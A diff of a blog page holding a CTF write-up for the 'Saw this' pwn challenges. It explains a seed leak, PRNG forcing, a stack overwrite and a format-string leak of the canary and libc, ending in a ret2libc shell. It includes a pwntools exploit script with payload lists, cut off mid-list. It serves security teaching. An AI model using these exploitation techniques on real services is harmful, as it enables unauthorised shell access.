@@ -311,7 +311,7 @@ nc 87.107.123.3 31337</p>
 
 <!-- more -->
 
-<p>64 bit ELF. Lauch it with the almighty IDA Pro and press the powerful F5 key, we’ll find that the service first ask us to input our user name and a lucky number. Then, it will use <code class="highlighter-rouge">srand</code> to set up the random number seed, and generate a random number sequence.</p>
+<p>64 bit ELF. Lauch it with the almighty IDA Pro and press the powerful F5 key, we’ll find that the service first ask us to input our user name and a lucky number. Then, it will use <code class="language-plaintext highlighter-rouge">srand</code> to set up the random number seed, and generate a random number sequence.</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">srand</span><span class="p">(</span><span class="n">seed</span> <span class="o">+</span> <span class="n">lucky_number</span><span class="p">);</span>
  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">format</span> <span class="o">=</span> <span class="s">"YOU LOST THE GAME! IT'S OVER!"</span><span class="p">;</span>
@@ -336,8 +336,8 @@ nc 87.107.123.3 31337</p>
  <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
     <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
- <span class="n">print_freedom</span><span class="p">();</span> <span class="c1">// get flag1
-</span> <span class="k">do</span>
+ <span class="n">print_freedom</span><span class="p">();</span> <span class="c1">// get flag1</span>
+ <span class="k">do</span>
  <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Do you want to play again (y/n)? "</span><span class="p">);</span>
     <span class="n">read_input</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v12</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
@@ -348,9 +348,9 @@ nc 87.107.123.3 31337</p>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>For <strong>Saw this-1</strong>, we’ll have to try to guess all the random numbers. By investigating the memory, we found that our <code class="highlighter-rouge">user_name</code> start from <code class="highlighter-rouge">0x603108</code>, and the <code class="highlighter-rouge">seed</code> variable’s at <code class="highlighter-rouge">0x603148</code>. Since it let us input at most 64 characters, we can leak the <code class="highlighter-rouge">seed</code> by input a <code class="highlighter-rouge">user_name</code> which length’s 64 characters long. After we leak the <code class="highlighter-rouge">seed</code>, we can enter a <code class="highlighter-rouge">lucky_number</code> which cause the line <code class="highlighter-rouge">srand(seed + lucky_number);</code> into <code class="highlighter-rouge">srand(0)</code>. This will cause the server always generate a same group of random numbers, and so we can easily beat the game and get the flag1.</p>
+<p>For <strong>Saw this-1</strong>, we’ll have to try to guess all the random numbers. By investigating the memory, we found that our <code class="language-plaintext highlighter-rouge">user_name</code> start from <code class="language-plaintext highlighter-rouge">0x603108</code>, and the <code class="language-plaintext highlighter-rouge">seed</code> variable’s at <code class="language-plaintext highlighter-rouge">0x603148</code>. Since it let us input at most 64 characters, we can leak the <code class="language-plaintext highlighter-rouge">seed</code> by input a <code class="language-plaintext highlighter-rouge">user_name</code> which length’s 64 characters long. After we leak the <code class="language-plaintext highlighter-rouge">seed</code>, we can enter a <code class="language-plaintext highlighter-rouge">lucky_number</code> which cause the line <code class="language-plaintext highlighter-rouge">srand(seed + lucky_number);</code> into <code class="language-plaintext highlighter-rouge">srand(0)</code>. This will cause the server always generate a same group of random numbers, and so we can easily beat the game and get the flag1.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I've thought of 10 numbers. If you guess them correctly, you are free!
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I've thought of 10 numbers. If you guess them correctly, you are free!
 Number #1: 
 [+] sending: 44
 Number #2: 
@@ -405,11 +405,11 @@ YOU WON! You are free now!      _   _  _____ _ _____   _   _ _____ _____   _____
 Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 </code></pre></div></div>
 
-<p>For <strong>Saw this-2</strong>, we’ll have to try to get a shell. The above pseudo code show us that there’s a <strong>format string vulnerability</strong> in the program. It seems that the <code class="highlighter-rouge">format</code> variable is hard-coded in the program, we can’t control it directly. But it’s on the stack, so if we can find a way to overwrite the <code class="highlighter-rouge">format</code> pointer, we’ll be able to trigger the format string vulnerability.</p>
+<p>For <strong>Saw this-2</strong>, we’ll have to try to get a shell. The above pseudo code show us that there’s a <strong>format string vulnerability</strong> in the program. It seems that the <code class="language-plaintext highlighter-rouge">format</code> variable is hard-coded in the program, we can’t control it directly. But it’s on the stack, so if we can find a way to overwrite the <code class="language-plaintext highlighter-rouge">format</code> pointer, we’ll be able to trigger the format string vulnerability.</p>
 
-<p>It seems our only chance is to control the content of <code class="highlighter-rouge">v7[j]</code>. If <code class="highlighter-rouge">j</code> is big enough, we’ll be able to overwrite all the vairables on the stack, <strong>even the return address</strong>. We found that <code class="highlighter-rouge">v8</code> (the variable holds the iteration number) is exactly at <code class="highlighter-rouge">v7[16]</code>. So we’ll have to try to make <code class="highlighter-rouge">v8</code> &gt;= 17, which is, making the return value of <code class="highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> = 17.</p>
+<p>It seems our only chance is to control the content of <code class="language-plaintext highlighter-rouge">v7[j]</code>. If <code class="language-plaintext highlighter-rouge">j</code> is big enough, we’ll be able to overwrite all the vairables on the stack, <strong>even the return address</strong>. We found that <code class="language-plaintext highlighter-rouge">v8</code> (the variable holds the iteration number) is exactly at <code class="language-plaintext highlighter-rouge">v7[16]</code>. So we’ll have to try to make <code class="language-plaintext highlighter-rouge">v8</code> &gt;= 17, which is, making the return value of <code class="language-plaintext highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> = 17.</p>
 
-<p>For random numbers, the only variable we can control is <code class="highlighter-rouge">lucky_number</code>. We’ll have to find a proper number <code class="highlighter-rouge">N</code> = <code class="highlighter-rouge">seed</code> + <code class="highlighter-rouge">lucky_number</code>, and let <code class="highlighter-rouge">srand(N)</code> set the right random number seed so <code class="highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> will be equal to 17. And so I wrote a C program to achieve the requirement:</p>
+<p>For random numbers, the only variable we can control is <code class="language-plaintext highlighter-rouge">lucky_number</code>. We’ll have to find a proper number <code class="language-plaintext highlighter-rouge">N</code> = <code class="language-plaintext highlighter-rouge">seed</code> + <code class="language-plaintext highlighter-rouge">lucky_number</code>, and let <code class="language-plaintext highlighter-rouge">srand(N)</code> set the right random number seed so <code class="language-plaintext highlighter-rouge">(signed int)floor(gen_rand_double() * 13.0 + 4.0)</code> will be equal to 17. And so I wrote a C program to achieve the requirement:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -446,28 +446,28 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 
 </code></pre></div></div>
 
-<p>The line <code class="highlighter-rouge">initstate(0, statebuf, 8)</code> is required to get the correct number, since the original binary has the exact same line of code in the initial process. Finally, we get <code class="highlighter-rouge">N</code> = <code class="highlighter-rouge">0x0dbdbb1e</code></p>
+<p>The line <code class="language-plaintext highlighter-rouge">initstate(0, statebuf, 8)</code> is required to get the correct number, since the original binary has the exact same line of code in the initial process. Finally, we get <code class="language-plaintext highlighter-rouge">N</code> = <code class="language-plaintext highlighter-rouge">0x0dbdbb1e</code></p>
 
-<p>So now everytime we send a <code class="highlighter-rouge">lucky_number</code>, it has to be <code class="highlighter-rouge">0x0dbdbb1e</code> - <code class="highlighter-rouge">seed</code>. Since <code class="highlighter-rouge">v8</code> is set to 17 now, whenever we send the 17th number, <code class="highlighter-rouge">v8</code> will be modify to the number we send, which means we can control the iteration numbers, and so are the variables on the stack.</p>
+<p>So now everytime we send a <code class="language-plaintext highlighter-rouge">lucky_number</code>, it has to be <code class="language-plaintext highlighter-rouge">0x0dbdbb1e</code> - <code class="language-plaintext highlighter-rouge">seed</code>. Since <code class="language-plaintext highlighter-rouge">v8</code> is set to 17 now, whenever we send the 17th number, <code class="language-plaintext highlighter-rouge">v8</code> will be modify to the number we send, which means we can control the iteration numbers, and so are the variables on the stack.</p>
 
 <p>Here are some important variables we’ll have to modify (overwrite):</p>
 <ol>
-  <li><code class="highlighter-rouge">v8</code>. The iteration number</li>
-  <li><code class="highlighter-rouge">v10</code>. Overwrite it to <strong>1</strong> so we won’t lose the game.</li>
-  <li><code class="highlighter-rouge">format</code>. Modify the pointer to the <code class="highlighter-rouge">user_name</code> buffer’s address (<code class="highlighter-rouge">0x603108</code>). Now we can trigger the format string vulnerability.</li>
+  <li><code class="language-plaintext highlighter-rouge">v8</code>. The iteration number</li>
+  <li><code class="language-plaintext highlighter-rouge">v10</code>. Overwrite it to <strong>1</strong> so we won’t lose the game.</li>
+  <li><code class="language-plaintext highlighter-rouge">format</code>. Modify the pointer to the <code class="language-plaintext highlighter-rouge">user_name</code> buffer’s address (<code class="language-plaintext highlighter-rouge">0x603108</code>). Now we can trigger the format string vulnerability.</li>
 </ol>
 
-<p>Notice that other important variables (ex.<code class="highlighter-rouge">luck_number</code>) will have to remain the same value after you overwrite the stack. As for the format string payload, at first I try to use <strong>%n</strong> to write the memory, until I found that the service <strong>won’t let us input our user name for second time</strong>. Since we can’t reuse the vulnerability, I decided to leak the <strong>stack canary</strong> and the <strong>return address</strong> ( which returns to <code class="highlighter-rouge">__libc_start_main</code> ).</p>
+<p>Notice that other important variables (ex.<code class="language-plaintext highlighter-rouge">luck_number</code>) will have to remain the same value after you overwrite the stack. As for the format string payload, at first I try to use <strong>%n</strong> to write the memory, until I found that the service <strong>won’t let us input our user name for second time</strong>. Since we can’t reuse the vulnerability, I decided to leak the <strong>stack canary</strong> and the <strong>return address</strong> ( which returns to <code class="language-plaintext highlighter-rouge">__libc_start_main</code> ).</p>
 
-<p>Now we have the stack canary and the libc address. We can use the libc address to calculate the libc’s base address, and get the address of <code class="highlighter-rouge">system</code>, <code class="highlighter-rouge">pop rdi, ret</code> gadget and <code class="highlighter-rouge">/bin/sh</code> string pointer. After we have all the information, we can overwrite the stack canary and the return address to launch a return-2-libc attack.</p>
+<p>Now we have the stack canary and the libc address. We can use the libc address to calculate the libc’s base address, and get the address of <code class="language-plaintext highlighter-rouge">system</code>, <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget and <code class="language-plaintext highlighter-rouge">/bin/sh</code> string pointer. After we have all the information, we can overwrite the stack canary and the return address to launch a return-2-libc attack.</p>
 
 <p>To sum up, here’s the exploitation of Saw this-2:</p>
 <ol>
-  <li>Brute-Force the <code class="highlighter-rouge">srand</code> seed so <code class="highlighter-rouge">v8</code>(the iteration number) can be set to <code class="highlighter-rouge">17</code>.</li>
-  <li>Overwrite <code class="highlighter-rouge">v7[16]</code> (=<code class="highlighter-rouge">v8</code>), so we can overwrite the variables on the stack.</li>
-  <li>Overwrite <code class="highlighter-rouge">format</code> to the <code class="highlighter-rouge">user_name</code> buffer so we can trigger the format string vulnerability.</li>
+  <li>Brute-Force the <code class="language-plaintext highlighter-rouge">srand</code> seed so <code class="language-plaintext highlighter-rouge">v8</code>(the iteration number) can be set to <code class="language-plaintext highlighter-rouge">17</code>.</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">v7[16]</code> (=<code class="language-plaintext highlighter-rouge">v8</code>), so we can overwrite the variables on the stack.</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">format</code> to the <code class="language-plaintext highlighter-rouge">user_name</code> buffer so we can trigger the format string vulnerability.</li>
   <li>Leak the stack canary &amp; return address.</li>
-  <li>Use the return adress to calculate libc’s base address, so we can get <code class="highlighter-rouge">system</code>, <code class="highlighter-rouge">pop rdi, ret</code> &amp; <code class="highlighter-rouge">/bin/sh</code>’s address.</li>
+  <li>Use the return adress to calculate libc’s base address, so we can get <code class="language-plaintext highlighter-rouge">system</code>, <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> &amp; <code class="language-plaintext highlighter-rouge">/bin/sh</code>’s address.</li>
   <li>Overwrite the stack canary &amp; return address to launch the return-2-libc attack.</li>
 </ol>
 
@@ -482,20 +482,20 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 
 <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
-<span class="c"># name buffer address = 0x603108</span>
-<span class="c"># %21$p -0xfd - 0x1edb0 = libc_base</span>
-<span class="c"># %17$p = canary</span>
-
-<span class="c">#send name</span>
-<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"call you? "</span><span class="p">)</span>
+<span class="c1"># name buffer address = 0x603108
+# %21$p -0xfd - 0x1edb0 = libc_base
+# %17$p = canary
+</span>
+<span class="c1">#send name
+</span><span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"call you? "</span><span class="p">)</span>
 <span class="n">name</span> <span class="o">=</span> <span class="s">"</span><span class="si">%17</span><span class="s">$p.</span><span class="si">%21</span><span class="s">$p."</span>
 <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
 <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
 <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">64</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
 
-<span class="c"># exploit PRNG</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="c1"># exploit PRNG
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 <span class="k">print</span> <span class="s">"s:"</span><span class="p">,</span> <span class="n">s</span>
 <span class="n">seed</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">+</span><span class="mi">64</span><span class="p">:</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"!"</span><span class="p">):]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"seed: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">))</span>
@@ -514,45 +514,45 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span><span class="o">+</span><span class="s">" + "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">)</span><span class="o">+</span><span class="s">" = "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lucky_number</span><span class="o">+</span><span class="n">seed</span><span class="p">))</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">lucky_number</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<span class="c"># 0~15 to pass the first 16 numbers</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+<span class="c1"># 0~15 to pass the first 16 numbers
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
     <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
     <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"44"</span><span class="p">,</span><span class="c">#17 byte, v8</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c"># lucky number</span>
-            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c"># lucky number</span>
-            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c"># lucky number</span>
-            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c"># lucky number</span>
-           <span class="s">"1"</span><span class="p">,</span> <span class="c"># v10 for win</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"17"</span><span class="p">,</span> <span class="c"># i</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_1</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_2</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"8"</span><span class="p">,</span> <span class="c">#name_buf 0x08</span>
-            <span class="s">"49"</span><span class="p">,</span> <span class="c">#name_buf 0x31</span>
-            <span class="s">"96"</span><span class="p">,</span> <span class="c">#name_buf 0x60</span>
-            <span class="s">"0"</span><span class="p">,</span> <span class="c">#name_buf 0x00</span>
-           <span class="p">]</span>
+<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"44"</span><span class="p">,</span><span class="c1">#17 byte, v8
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>           <span class="s">"1"</span><span class="p">,</span> <span class="c1"># v10 for win
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"17"</span><span class="p">,</span> <span class="c1"># i
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_1
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_2
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"8"</span><span class="p">,</span> <span class="c1">#name_buf 0x08
+</span>            <span class="s">"49"</span><span class="p">,</span> <span class="c1">#name_buf 0x31
+</span>            <span class="s">"96"</span><span class="p">,</span> <span class="c1">#name_buf 0x60
+</span>            <span class="s">"0"</span><span class="p">,</span> <span class="c1">#name_buf 0x00
+</span>           <span class="p">]</span>
 
 <span class="n">payloads</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payloads</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
-<span class="c"># sending payload</span>
-<span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+<span class="c1"># sending payload
+</span><span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
     <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
@@ -565,9 +565,9 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
 
 <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">libc_base</span>
-<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2024b</span> <span class="c"># pop rdi, ret</span>
-<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x14bc23</span>     <span class="c"># pointer to /bin/sh</span>
-<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2024b</span> <span class="c1"># pop rdi, ret
+</span><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x14bc23</span>     <span class="c1"># pointer to /bin/sh
+</span><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi_ret: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">))</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
@@ -579,113 +579,113 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"y</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<span class="c"># 0~15 to pass the first 16 numbers</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+<span class="c1"># 0~15 to pass the first 16 numbers
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
     <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
     <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"52"</span><span class="p">,</span><span class="c"># will be adjust later</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c"># lucky number</span>
-            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c"># lucky number</span>
-            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c"># lucky number</span>
-            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c"># lucky number</span>
-           <span class="s">"1"</span><span class="p">,</span> <span class="c"># v10 for win</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"17"</span><span class="p">,</span> <span class="c"># i</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_1</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># v12_2</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"8"</span><span class="p">,</span> <span class="c">#name_buf 0x08</span>
-            <span class="s">"49"</span><span class="p">,</span> <span class="c">#name_buf 0x31</span>
-            <span class="s">"96"</span><span class="p">,</span> <span class="c">#name_buf 0x60</span>
-            <span class="s">"0"</span><span class="p">,</span> <span class="c">#name_buf 0x00</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"168"</span><span class="p">,</span> <span class="c">#name_buf 0xa8</span>
-            <span class="s">"48"</span><span class="p">,</span> <span class="c">#name_buf 0x30</span>
-            <span class="s">"96"</span><span class="p">,</span> <span class="c">#name_buf 0x60</span>
-            <span class="s">"0"</span><span class="p">,</span> <span class="c">#name_buf 0x00</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="c"># canary 1</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="c"># canary 2</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="c"># canary 3</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="c"># canary 4</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="c"># canary 5</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="c"># canary 6</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="c"># canary 7</span>
-           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="c"># canary 8</span>
